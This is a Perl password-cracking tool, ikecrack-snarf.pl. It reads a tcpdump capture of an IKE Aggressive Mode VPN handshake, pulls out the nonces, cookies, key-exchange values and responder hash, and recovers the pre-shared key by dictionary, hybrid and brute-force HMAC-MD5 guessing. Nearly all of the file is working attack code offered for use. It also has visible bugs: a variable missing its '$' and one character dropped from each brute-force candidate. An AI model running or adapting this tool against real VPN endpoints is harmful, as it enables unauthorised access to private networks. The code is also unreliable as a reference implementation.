#!/usr/bin/perl

use Digest::HMAC_MD5 qw(hmac_md5 hmac_md5_hex);

# ikecrack-snarf.pl

# By Anton T. Rager - arager@avaya.com or a_rager@yahoo.com
# Version 1.00 - 9/29/2002
#
# Parses tcpdump -xq file to extract IKE info for calculating SKEYID and HASH_R

# 1.00 - added dictionary file and hybrid logic attacks, and added logic to print IDs - 9/25/2002
# 0.11 - modified crack loops to extend to 11 characters and stop on match.  Old looping was kludgy and a nasty hack.
# 0.10 - first release



#findhost is IKE initiator




# Static test var sets flag to use inline hard-coded IKE session values.  Set to 1 to enable static test, otherwise reads from logfile.dat.
$static_test=0;

# Variable for desired character set with crack.
# 0 = lcase, nums, and ucase
# 1 = lcase only
# 2 = ucase only
# 3 = nums only
$set_select=0;

if ($static_test) {
        # hardcoded info for testing IKECrack without a capture file. Catured from previous session. PSK used is "xxx".
        #
        $RX_HASH_R = "7657615908179c0d7ddb6712f3d0e31e";
        $nonce_i = "97c1292dcd4b3171a60c89d80a43fc023d522be9";
        $nonce_r = "b194f883458e04e58b226b223462c27fc1409178";

        $dhpub_i = "ab92ccf857eef66477825d345f300da0d6f1c5de7c10f9bdca0030134fc73a782085c127bcdaf811578a970ee6eff160dabf500d54758519ea5c7c7e1e394ef7ba1f2dcadcce318bb39d9633bd3aaef36d63b84b0f79e26469e3db3d2786739d";
        $dhpub_r = "e9a5c77627d01a648ba24078580dc88b85ee104bf9f1541b75e121d77e981b0a11c1f7073aab21704311cc5174af2588ccf73138af383f12d679b8ca2267fc1cf9013207e5d9b28331030a720f2dcd4ee543a0f68f0d024dbd9ded8d98723607";
        $cookie_i = "3a08ceef6b5d107d";
        $cookie_r = "fd532fd41127da2c";
        $SA_i = "00000001000000010000004801010002030000200101000080010001800200018003000180040001800b0001800c7080000000200201000080010001800200028003000180040001800b0001800c7080";
        $ID_r = "010000000a400101";

} else {

        $findhost=@ARGV[0];
        if (!$findhost) {
	        print("Usage:  ikecrack-snarf.pl <initiator_ip.port>\n\n  Example: ikecrack-snarf.pl 10.10.10.10.500\n");
	        exit;
        }

        print("Looking for Initiator : $findhost\n");
        #logfile.dat is saved output from tpcdump : ie "tcpdump -nxq port 500 > logfile.dat"
        if (! -r "logfile.dat") {
	        print("logfile.dat does not exist in current directory.\n\n--Create logfile.dat with tcpdump in the following manner:\n  tcpdump -nxq > logfile.dat\n");
	        exit;
        }
        open(TEST, "logfile.dat");
        @logfile = <TEST>;
        close(TEST);



        # This section of code parses the hex dumps from tcpdump, and then extracts the IKE payloads.  It also maintains some IKE state
        # info for the initiator and responder for later cracking
        #
        # I Known this code is nasty and that pcap is a much cleaner way to handle this.
        # Initialize IKE State vars
        $match=0;
        $aggr=0;
        $init=0;
        $matchcnt=0;
        $hexdone=0;
        $init="";
        $resp="";

        foreach $parserec (@logfile) {
	        if (substr($parserec, 0,1) != " ") {

		        if ($hexstart) {
			        $hexstart=0;
			        $hexdone=1;
			        if ($matchcnt eq 0) {
				        print("Init\n");
				        $ike = substr($init, 56);
			        }
			        if ($matchcnt eq 1) {
				        print("Resp\n");
				        $ike = substr($resp, 56);
			        }
                                        $ptr= 0;
                                        $tcookie_i = substr($ike, $ptr, 16);
                                        print("tcookie_i : $tcookie_i\n");
                                        $ptr=$ptr+16;
                                        $tcookie_r = substr($ike, $ptr, 16);
                                        print("tcookie_r : $tcookie_r\n");
                                        if ($tcookie_r ne "0000000000000000" && $matchcnt eq 0) {
                                	        print("Error : Non-Zero Cookie responder cookie with initiator packet\n");
                                	        exit;
                                        }
				        if (matchcnt eq 1) {
					        if ($cookie_i ne $tcookie_i) {
						        print("Error : Initiator Cookie mismatch with response\n");
						        exit;

					        }
				        }
				        $cookie_i = $tcookie_i;
				        $cookie_r = $tcookie_r;

                                        $ptr = $ptr +16;
                                        $nxt_pld = substr($ike, $ptr, 2);
                                        $ptr = $ptr + 4;
                                        $xchg = substr($ike, $ptr, 2);
                                        print("xchg type: $xchg\n");
                                        if ($xchg eq "04") {
                                	        print("Aggressive Mode - Continue\n");
                                        } else {
					        print("Error : Not Aggressive Mode\n");
                                	        exit;
                                        }
				        if ($xchg eq "05") {
					        print("Error : Informational Packet\n");
					        exit;
				        }
                                        $ptr = $ptr + 12;
                                        $ikelen = hex(substr($ike, $ptr, 8));
                                        $ptr = $ptr + 8;
                                        while ($nxt_pld ne "00") {
                                	        $this_pld = $nxt_pld;
                                	        $nxt_pld = substr($ike, $ptr, 2);
                                	        $ptr = $ptr + 4;
                                	        $pld_len = hex(substr($ike, $ptr, 4));
                                	        $ptr = $ptr + 4;
                                	        $payload = substr($ike, $ptr, $pld_len*2-8);
                                       	        if ($this_pld eq "01") {
                                                        if ($matchcnt) {
                                			        $SA_r = $payload;
							        print("SA_r    : $SA_r\n");
							        #check for matching proposal with MD5?
						        } else {
							        $SA_i = $payload;
							        print("SA_i    : $SA_i\n");
						        }
                                	        }

                                	        if ($this_pld eq "04") {
						        if ($matchcnt) {
                                			        $dhpub_r = $payload;
							        print("KE_r    : $dhpub_r\n");
        						} else {
							        $dhpub_i = $payload;
							        print("KE_i    : $dhpub_i\n");
						        }
                                        	}
                                        	if ($this_pld eq "05") {
		        				if ($matchcnt) {
                                        			$ID_r = $payload;
				        			print("ID_r    : $ID_r\n");
        						} else {
	                                        		if (length($payload) eq 48) {
	                                        			print("ID seems to be SHA1 hash - Nortel Client?\n");
	                                        			exit;
	                                        		}
        				        		$ID_i = $payload;
						        	print("ID_i    : $ID_i\n");
						        }
                                        	}
                                        	if ($this_pld eq "08") {
		        				$RX_HASH_R = $payload;
                                        		print("HASH_r  : $RX_HASH_R\n");
                                        	}
                                	        if ($this_pld eq "0a") {
						        if ($matchcnt) {
                                			        $nonce_r = $payload;
							        print("nonce_r    : $nonce_r\n");
        						} else {
	        						$nonce_i = $payload;
		        					print("nonce_i    : $nonce_i\n");
			        			}
                                        	}
	        				if ($this_pld eq "0b") {
		        				print("Ntfy   : $payload\n");
			        		}
                                                $ptr = $ptr + ($pld_len*2-8);
                                        }
                                        print("\n\n");

		                }

		                @heading=split(" ", $parserec);
	        	        print("Header IPs $heading[1] $heading[3]\n");
        		        if (!$match) {
	        		        chop($heading[3]);
        			        if ($heading[1] eq $findhost) {
 				                $ip1=$heading[1];
				                $ip2=$heading[3];
			                        $match=1;
				                $hexdone=0;
				                print("Matching Header $ip1 $ip2\n");
				                $initIP = "$heading[1] $heading[3]";

			                }
		                } else {
		        	        $matchcnt++;
                                        if ($matchcnt < 2) {
        				        $hexdone=0;
				                chop($heading[3]);
				                if ($heading[1] eq $ip2 && $heading[3] eq  $ip1) {
					                print("Reply Header? $heading[1] $heading[3]\n");
				        	        $respIP = "$heading[1] $heading[3]";
 		        	 	        }
			                }

        		        }

	                } else {
		                if ($match && $matchcnt < 2 && !$hexdone) {
			                $hexstart=1;
			                @hexdump=split(" ", $parserec);
			                foreach $hexrec (@hexdump) {
				                if ($matchcnt eq 0) {
					                $init= $init . $hexrec;
				                }
				                if ($matchcnt eq 1) {
					                $resp = $resp . $hexrec;
				                }
			        }
		        }


	        }
        }



}

if (!$RX_HASH_R) {
        die("No Responder HASH found for session\nMake sure you got an Aggressive IKE session in the logfile.dat file, and double check the intiating host IP/ports \n");
}

$noncedata = $nonce_i . $nonce_r;
$hashdata_r = $dhpub_r . $dhpub_i . $cookie_r . $cookie_i . $SA_i . $ID_r;


@lcase_charset = ("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z");
@ucase_charset = ("A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");
@nums_charset = ("0","1","2","3","4","5","6","7","8","9");
@punct_charset = ("\~", "\`", "\!", "\@", "\#", "\$", "\%", "\^", "\&", "\*", "\(", "\)", "\_", "\-", "\+", "\=", "\{", "\}", "\|", "\[", "\]", "\\", "\;", "\'", "\:", "\"", "\,", "\.", "\/", "\<", "\>", "\?");



if ($set_select eq 1) {
        # Lcase
        push(@charset, "");
        push(@charset, @lcase_charset);

} elsif ($set_select eq 2) {
        # UCase
        push(@charset, "");
        push(@charset, @ucase_charset);

} elsif ($set_select eq 3) {
        # Nums
        push(@charset, "");
        push(@charset, @nums_charset);

} else {
        # LCase + Nums + Ucase
        push(@charset, "");
        push(@charset, @lcase_charset);
        push(@charset, @nums_charset);
        push(@charset, @ucase_charset);

}


$el_size = scalar(@charset)-1;

# Pre-Processing of input data to convert from hex to characters

 for ($y=0; $y<length($noncedata); $y=$y+2) {
	$tmp = chr(hex(substr($noncedata, $y, 2)));
	$noncedata_char = $noncedata_char . $tmp;
 }



 for ($y=0; $y<length($hashdata_r); $y=$y+2) {
	$tmp = chr(hex(substr($hashdata_r, $y, 2)));
	$hashdatar_char = $hashdatar_char . $tmp;
 }




print("\nInitiator_ID - ");
for ($y=0; $y<length($ID_i); $y=$y+2) {
        if ($y eq 0) {
                if(hex(substr($ID_i, $y, 2)) eq 0x03) {
                        print("Type is FQDN: ");
                        $idtype=3;
                } elsif (hex(substr($ID_i, $y, 2)) eq 0x01) {
                        print("Type is IPv4: ");
                        $idtype=1;
                } else {
                        print("Type unknown: ");
                }
        }
        if ($idtype eq 3 && $y > 7) {
                $tmp = chr(hex(substr($ID_i, $y, 2)));
	        print("$tmp");
        } elsif ($idtype eq 1 && $y > 7) {
                $tmp = hex(substr($ID_i, $y, 2));
	        print("$tmp");
                if ($y ne length($ID_i)-2) {
                        print(".");
                }
        }
}


print("\nResponder_ID - ");

for ($y=0; $y<length($ID_r); $y=$y+2) {
        if ($y eq 0) {
                if(hex(substr($ID_r, $y, 2)) eq 0x03) {
                        print("Type is FQDN: ");
                        $idtype=3;
                } elsif (hex(substr($ID_r, $y, 2)) eq 0x01) {
                        print("Type is IPv4: ");
                        $idtype=1;
                } else {
                        print("Type unknown: ");
                }
        }
        if ($idtype eq 3 && $y > 7) {
                $tmp = chr(hex(substr($ID_r, $y, 2)));
	        print("$tmp");
        } elsif ($idtype eq 1 && $y > 7) {
                $tmp = hex(substr($ID_r, $y, 2));
	        print("$tmp");
                if ($y ne length($ID_r)-2) {
                        print(".");
                }
        }
}


print ("\nResponder Sent MD5 HASH_R : $RX_HASH_R\n\n");


# End Pre-Processing
#
#
# Start Bruteforce Loops


print("Starting Grinder.............\n\n");

if (-f "wordlist") {
print("Reading Dictionary File\n");
open(CRACKFILE, "wordlist");
@cracklist = <CRACKFILE>;
close(CRACKFILE);

print("Starting Dictionary Attack:\n");
foreach $cracktest (@cracklist) {
                        chomp($cracktest);
			$SKEY_char = hmac_md5($noncedata_char, $cracktest);
			$MD_HASH_R = hmac_md5_hex($hashdatar_char, $SKEY_char);

			if ($RX_HASH_R eq $MD_HASH_R) {
				print ("match with $cracktest\n");
				print ("Calc MD5 HASH_R : $MD_HASH_R\n");
				$SKEY_hex = hmac_md5_hex($noncedata_char, $cracktest);
				print ("Calc SKEYID : $SKEY_hex\n");
                                exit;
                        }

}


print("No matches\n\n");


print("Starting Hybrid Attack:\n");
push(@hybrid_charset, @punct_charset);
push(@hybrid_charset, @nums_charset);
foreach $cracktest (@cracklist) {
                        chomp($cracktest);
                        foreach $hybrid (@hybrid_charset) {
                                $hybridtest = $cracktest . $hybrid;
                                $SKEY_char = hmac_md5($noncedata_char, $hybridtest);
			        $MD_HASH_R = hmac_md5_hex($hashdatar_char, $SKEY_char);

			        if ($RX_HASH_R eq $MD_HASH_R) {
				        print ("match with $hybridtest\n");
				        print ("Calc MD5 HASH_R : $MD_HASH_R\n");
				        $SKEY_hex = hmac_md5_hex($noncedata_char, $hybridtest);
				        print ("Calc SKEYID : $SKEY_hex\n");
                                        exit;
                                }
                                $hybridtest = $hybrid . $cracktest;
                                $SKEY_char = hmac_md5($noncedata_char, $hybridtest);
			        $MD_HASH_R = hmac_md5_hex($hashdatar_char, $SKEY_char);

			        if ($RX_HASH_R eq $MD_HASH_R) {
				        print ("match with $hybridtest\n");
				        print ("Calc MD5 HASH_R : $MD_HASH_R\n");
				        $SKEY_hex = hmac_md5_hex($noncedata_char, $hybridtest);
				        print ("Calc SKEYID : $SKEY_hex\n");
                                        exit;
                                }

                        }
}

print("No matches\n\n");

} else {
        print("No dictionary file found - skipping to bruteforce\n\tHint: create the file \"wordlist\" for a dictionary attack\n\n");

}



print("Starting Bruteforce Attack:\n");
print("Character Set: @charset\n\n");

$starttime = time();

foreach $char0 (@charset) {
	if ($level1 && !$char0) {
		next;
	}

foreach $char1 (@charset) {
	if ($level2 && !$char1) {
		next;
	}
	foreach $char2 (@charset) {
		if($level3 && !$char2) {
			next;
		}

		foreach $char3 (@charset) {
			if ($level4 && !$char3) {
				next;
			}
			foreach $char4 (@charset) {
				if ($level5 && !$char4) {
					next;
				}
				foreach $char5 (@charset) {
					if ($level6 && !$char5) {
						next;
					}
						foreach $char6 (@charset) {
							if ($level7 && !$char6) {
								next;
								}
							foreach $char7 (@charset) {
								if ($level8 && !$char7) {
									next;
								}

								foreach $char8 (@charset) {
									if ($level9 && !$char8) { 
										next;
									}
									foreach $char9 (@charset) {
										if ($level10 && !$char9) { 
											next;
										}

										foreach $char10 (@charset) {
											if (!$char10) { 
												next;
											}

			$level10=1;
			$brutekey = $char10 . $char9 . $char8 . $char7 . $char6 . $char4 . $char3 . $char2 . $char1 . $char0;
			$SKEY_char = hmac_md5($noncedata_char, $brutekey);
			$MD_HASH_R = hmac_md5_hex($hashdatar_char, $SKEY_char);

			if ($RX_HASH_R eq $MD_HASH_R) {
				print ("match with $brutekey\n");
				print ("Calc MD5 HASH_R : $MD_HASH_R\n");
				$SKEY_hex = hmac_md5_hex($noncedata_char, $brutekey);
				print ("Calc SKEYID : $SKEY_hex\n");

				$elapsedtime = time()-$starttime;
				print ("Elapsed Time : $elapsedtime seconds\n");

				exit;
			}
							}

						if (!$level9) {
							$level9=1;
							$elapsedtime = time()-$starttime;
							print("Character 1 Done : Time $elapsedtime seconds\n");

						}
						}

						if (!$level8) {
							$level8=1;
							$elapsedtime = time()-$starttime;
							print("Character 2 Done : Time $elapsedtime seconds\n");

						}
						}


						if (!$level7) {
							$level7=1;
							$elapsedtime = time()-$starttime;
							print("Character 3 Done : Time $elapsedtime seconds\n");
						}
						}

						if (!$level6) {
							$level6=1;
							$elapsedtime = time()-$starttime;
							print("Character 4 Done : Time $elapsedtime seconds\n");

						}
						}

					if (!$level5) {
						$level5=1;
						$elapsedtime = time()-$starttime;
						print("Character 5 Done : Time $elapsedtime seconds\n");

					}
					}

				if (!$level4) {
					$level4=1;
					$elapsedtime = time()-$starttime;
					print("Character 6 Done : Time $elapsedtime seconds\n");

				}
				}
			if (!$level3) {
				$level3=1;
				$elapsedtime = time()-$starttime;
				print("Character 7 Done : Time $elapsedtime seconds\n");

			}
			}
	if (!$level2) {
		$level2=1;
		$elapsedtime = time()-$starttime;
		print("Character 8 Done : Time $elapsedtime seconds\n");
	}
	}
if (!$level1) {
	$level1=1;
	$elapsedtime = time()-$starttime;
	print("Character 9 Done : Time $elapsedtime seconds\n");
}
}
if (!$level0) {
	$level0=1;
	$elapsedtime = time()-$starttime;
	print("Character 10 Done : Time $elapsedtime seconds\n");
}
}

# End Bruteforce Loops

